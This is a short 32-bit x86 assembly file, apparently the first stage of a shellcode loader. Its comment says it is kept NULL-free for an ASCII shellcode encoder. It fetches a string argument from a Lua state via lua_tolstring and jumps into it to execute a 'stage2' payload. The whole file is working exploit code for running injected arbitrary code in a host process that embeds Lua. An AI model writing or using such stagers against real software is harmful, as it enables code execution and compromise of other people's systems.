%include 'globals.inc'

bits 32
section text
org asciiLoaderBase

; needs to be NULL free for ASCII shellcode encoder

loader:
		xor eax, eax
		
		push eax				; NULL
		push 2					; 2nd lua arg
		push dword [esp+18h]	; lua_state
		
		mov edi, lua_tolstring | (1 << 31)
		shl edi, 1
		shr edi, 1
		call [edi]				; call [lua_tolstring]
		jmp eax					; execute stage2
